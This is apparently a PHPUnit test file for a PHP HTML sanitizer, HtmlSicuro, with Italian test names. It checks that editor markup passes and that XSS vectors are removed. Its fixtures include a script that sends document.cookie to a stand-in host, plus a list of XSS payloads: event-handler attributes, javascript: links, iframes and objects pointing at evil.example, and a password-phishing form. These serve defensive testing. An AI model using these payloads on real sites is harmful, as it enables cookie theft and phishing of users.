<?php

namespace Tests\Unit;

use App\Support\HtmlSicuro;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class HtmlSicuroTest extends TestCase
{
    public function test_lascia_passare_quello_che_scrive_il_richeditor(): void
    {
        $html = '<p>Gentile cliente,</p><p><strong>due</strong> macchine <em>Franke</em>.</p><ul><li>Prima</li><li>Seconda</li></ul>';

        $this->assertSame($html, HtmlSicuro::filtra($html));
    }

    public function test_toglie_lo_script_ma_tiene_il_testo_intorno(): void
    {
        $pulito = HtmlSicuro::filtra('<p>Prima</p><script>fetch("//io.example/"+document.cookie)</script><p>Dopo</p>');

        $this->assertStringNotContainsString('script', $pulito);
        $this->assertStringNotContainsString('document.cookie', $pulito);
        $this->assertStringContainsString('Prima', $pulito);
        $this->assertStringContainsString('Dopo', $pulito);
    }

    #[DataProvider('payload')]
    public function test_i_vettori_noti_non_passano(string $cattivo): void
    {
        $pulito = strtolower(HtmlSicuro::filtra($cattivo));

        $this->assertStringNotContainsString('onerror', $pulito);
        $this->assertStringNotContainsString('onload', $pulito);
        $this->assertStringNotContainsString('onclick', $pulito);
        $this->assertStringNotContainsString('javascript:', $pulito);
        $this->assertStringNotContainsString('<script', $pulito);
        $this->assertStringNotContainsString('<iframe', $pulito);
        $this->assertStringNotContainsString('<object', $pulito);
        $this->assertStringNotContainsString('<form', $pulito);
    }

    public static function payload(): array
    {
        return [
            'img onerror' => ['<img src=x onerror="alert(1)">'],
            'body onload' => ['<body onload=alert(1)>testo</body>'],
            'link javascript' => ['<a href="javascript:alert(1)">clicca</a>'],
            'link javascript spezzato' => ["<a href=\"java\tscript:alert(1)\">clicca</a>"],
            'iframe' => ['<iframe src="https://evil.example"></iframe>'],
            'svg onload' => ['<svg/onload=alert(1)>'],
            'form di phishing' => ['<form action="https://evil.example"><input name="password"></form>'],
            'script maiuscolo' => ['<SCRIPT>alert(1)</SCRIPT>'],
            'div onclick' => ['<div onclick="alert(1)">testo</div>'],
            'object' => ['<object data="https://evil.example"></object>'],
            'commento con markup' => ['<!--<script>alert(1)</script>-->'],
            'style con url' => ['<p style="background:url(https://evil.example/log)">testo</p>'],
        ];
    }

    public function test_i_link_veri_restano_e_quelli_esterni_prendono_il_rel(): void
    {
        $pulito = HtmlSicuro::filtra('<a href="https://alexcaffe.com" target="_blank">sito</a>');

        $this->assertStringContainsString('href="https://alexcaffe.com"', $pulito);
        $this->assertStringContainsString('noopener', $pulito);
    }

    public function test_le_accentate_non_si_rompono(): void
    {
        $this->assertStringContainsString('perché città', HtmlSicuro::filtra('<p>perché città</p>'));
    }

    public function test_il_vuoto_resta_vuoto(): void
    {
        $this->assertSame('', HtmlSicuro::filtra(null));
        $this->assertSame('', HtmlSicuro::filtra('   '));
    }
}
